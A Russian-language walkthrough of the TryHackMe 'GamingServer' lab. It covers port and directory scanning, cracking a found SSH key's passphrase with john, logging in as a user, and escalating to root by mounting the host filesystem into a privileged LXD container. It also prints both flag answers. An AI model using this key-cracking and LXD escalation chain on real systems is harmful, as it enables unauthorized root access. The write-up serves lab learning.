[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [GamingServer](https://tryhackme.com/r/room/gamingserver) 

Всего 1 заданиe:
## Задание 1
Можете ли вы получить доступ к этому игровому серверу, созданному любителями без опыта веб-разработки, и 
воспользоваться преимуществами системы развертывания? 

### Ответьте на вопросы ниже
Что такое флаг пользователя?

```commandline
nmap -sC -sV <IP>
```

Итак, у нас есть сервер ssh, работающий на порту 22, и веб-сервер Apache, работающий на порту 80. Имя веб-сервера — 
«House of danak». Операционная система — Ubuntu.
Просматривая исходный код веб-страницы, мы находим комментарий, который дает нам возможное имя пользователя «john».
Перейдя в раздел « DRAAGAN LORE », мы увидим кнопку «Upload», на этот же каталог указывает файл /robots.txt.

`http://<IP>/uploads/`
Затем я запустил Gobuster для перебора всех доступных каталогов. При доступе к /secret. Там есть файл secretKey. При 
просмотре файла это зашифрованный ключ rsa, возьмем его и расшифруем при помощи уже найденного файла dict.lst
```commandline
gobuster dir -u <IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ssh2john secretKey > hash.txt
john --wordlist=dict.lst hash.txt 
# letmein 

ssh -i secretKey john@<IP>
# letmein
cat user.txt
```
 ```commandline
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```
Что такое корневой флаг?
```commandline
id
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine      
cd lxd-alpine-builder
./build-alpine
ls
```
Далее нам нужно скопировать сжатый файл на целевую машину, а затем импортировать образ с помощью lxc
```commandline
lxc image import ./alpine-* --alias myimage
lxc image list
lxc init myimage image -c security.privileged=true
lxc config device add image mydevice disk source=/ path=/mnt/root recursive=true
lxc exec image /bin/sh
id
cd /mnt/root/root/
cat root.txt
```
```commandline
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)